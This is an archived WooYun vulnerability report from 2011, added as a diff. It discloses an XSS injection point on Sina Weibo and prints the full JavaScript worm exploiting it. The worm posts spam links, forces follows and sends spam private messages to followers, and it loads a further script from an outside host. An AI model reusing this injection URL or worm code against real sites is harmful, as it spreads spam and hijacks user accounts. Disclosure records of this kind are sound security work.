@@ -1,0 +1,331 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪微博XSS漏洞点 &amp; XSS脚本内容分析  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪微博XSS漏洞点 &amp; XSS脚本内容分析  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2011-06-29 08:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-06-29：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-07-04：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">微博XSS漏洞点 <br />
+weibo.com/pub/star/g/xyyyd%22%3e%3cscript%20src=//www.****.com/images/t.js%3e%3c/script%3e?type=update </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">微博XSS脚本内容 <br />
+<br />
+function createXHR(){ <br />
+<br />
+return window.XMLHttpRequest? <br />
+<br />
+new XMLHttpRequest(): <br />
+<br />
+new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); <br />
+<br />
+} <br />
+<br />
+function getappkey(url){ <br />
+<br />
+xmlHttp = createXHR(); <br />
+<br />
+xmlHttp.open(&quot;GET&quot;,url,false); <br />
+<br />
+xmlHttp.send(); <br />
+<br />
+result = xmlHttp.responseText; <br />
+<br />
+id_arr = &#039;&#039;; <br />
+<br />
+id = result.match(/namecard=\&quot;true\&quot; title=\&quot;[^\&quot;]*/g); <br />
+<br />
+for(i=0;i&lt;id.length;i++){ <br />
+<br />
+sum = id.toString().split(&#039;&quot;&#039;)[3]; <br />
+<br />
+id_arr += sum + &#039;||&#039;; <br />
+<br />
+} <br />
+<br />
+return id_arr; <br />
+<br />
+} <br />
+<br />
+function random_msg(){ <br />
+<br />
+link = &#039; http://163.fm/PxZHoxn?id=&#039; + new Date().getTime();; <br />
+<br />
+var msgs = [ <br />
+<br />
+&#039;郭美美事件的一些未注意到的细节：&#039;, <br />
+<br />
+&#039;建党大业中穿帮的地方：&#039;, <br />
+<br />
+&#039;让女人心动的100句诗歌：&#039;, <br />
+<br />
+&#039;3D肉团团高清普通话版种子：&#039;, <br />
+<br />
+&#039;这是传说中的神仙眷侣啊：&#039;, <br />
+<br />
+&#039;惊爆!范冰冰艳照真流出了：&#039;, <br />
+<br />
+&#039;杨幂被爆多次被潜规则:&#039;, <br />
+<br />
+&#039;傻仔拿锤子去抢银行：&#039;, <br />
+<br />
+&#039;可以监听别人手机的软件：&#039;, <br />
+<br />
+&#039;个税起征点有望提到4000：&#039;]; <br />
+<br />
+var msg = msgs[Math.floor(Math.random()*msgs.length)] + link; <br />
+<br />
+msg = encodeURIComponent(msg); <br />
+<br />
+return msg; <br />
+<br />
+} <br />
+<br />
+function post(url,data,sync){ <br />
+<br />
+xmlHttp = createXHR(); <br />
+<br />
+xmlHttp.open(&quot;POST&quot;,url,sync); <br />
+<br />
+xmlHttp.setRequestHeader(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;); <br />
+<br />
+xmlHttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;); <br />
+<br />
+xmlHttp.send(data); <br />
+<br />
+} <br />
+<br />
+function publish(){ <br />
+<br />
+url = &#039;http://weibo.com/mblog/publish.php?rnd=&#039; + new Date().getTime(); &quot;发送微博&quot; <br />
+<br />
+data = &#039;content=&#039; + random_msg() + &#039;&amp;pic=&amp;styleid=2&amp;retcode=&#039;; <br />
+<br />
+post(url,data,true); <br />
+<br />
+} <br />
+<br />
+function follow(){ <br />
+<br />
+url = &#039;http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=&#039; + new Date().getTime(); <br />
+<br />
+data = &#039;uid=&#039; + 2201270010 + &#039;&amp;fromuid=&#039; + $CONFIG.$uid + &#039;&amp;refer_sort=profile&amp;atnId=profile&#039;; <br />
+<br />
+post(url,data,true); &quot;加关注&quot; <br />
+<br />
+} <br />
+<br />
+function message(){ <br />
+<br />
+url = &#039;http://weibo.com/&#039; + $CONFIG.$uid + &#039;/follow&#039;; &quot;给粉丝发私信&quot; <br />
+<br />
+ids = getappkey(url); <br />
+<br />
+id = ids.split(&#039;||&#039;); <br />
+<br />
+for(i=0;i&lt;id.length - 1 &amp; i&lt;5;i++){ <br />
+<br />
+msgurl = &#039;http://weibo.com/message/addmsg.php?rnd=&#039; + new Date().getTime(); <br />
+<br />
+msg = random_msg(); <br />
+<br />
+msg = encodeURIComponent(msg); <br />
+<br />
+user = encodeURIComponent(encodeURIComponent(id)); <br />
+<br />
+data = &#039;content=&#039; + msg + &#039;&amp;name=&#039; + user + &#039;&amp;retcode=&#039;; <br />
+<br />
+post(msgurl,data,false); <br />
+<br />
+} <br />
+<br />
+} <br />
+<br />
+function main(){ <br />
+<br />
+try{ <br />
+<br />
+publish(); <br />
+<br />
+} <br />
+<br />
+catch(e){} <br />
+<br />
+try{ <br />
+<br />
+follow(); <br />
+<br />
+} <br />
+<br />
+catch(e){} <br />
+<br />
+try{ <br />
+<br />
+message(); <br />
+<br />
+} <br />
+<br />
+catch(e){} <br />
+<br />
+} <br />
+<br />
+try{ <br />
+<br />
+x=&quot;g=document.createElement(&#039;script&#039;);g.src=&#039;http://www.2kt.cn/images/t.js&#039;;document.body.appendChild(g)&quot;;window.opener.eval(x); <br />
+<br />
+} <br />
+<br />
+catch(e){} <br />
+<br />
+main(); <br />
+<br />
+var t=setTimeout(&#039;location=&quot;http://weibo.com/pub/topic&quot;;&#039;,5000);  </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02338" title="新浪微博XSS漏洞点 &amp; XSS脚本内容分析">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2011-06-29 10:35</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：4 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="2338";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
